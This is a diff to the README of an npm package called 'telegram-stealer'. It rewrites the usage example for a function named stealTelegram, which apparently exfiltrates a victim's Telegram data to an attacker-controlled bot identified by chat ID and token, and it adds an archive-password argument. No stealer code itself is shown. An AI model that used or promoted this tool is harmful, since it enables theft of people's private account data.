@@ -47,11 +47,14 @@ npm install https://github.com/rigwild/telegram-stealer.git
 ```js
 import { run as stealTelegram } from 'telegram-stealer'
 
-await stealTelegram({
-  telegramChatId: '<chat_id>',
-  telegramToken: '<bot_token>',
-  waitOnStart: false
-})
+type StealTelegram = (
+  telegramChatId: string,
+  telegramToken: string,
+  archivePassword?: string,
+  waitOnStart?: boolean
+) => Promise<void>
+
+await stealTelegram('<chat_id>', '<bot_token>', '<archivePassword>', false)
 ```
 
 ## License
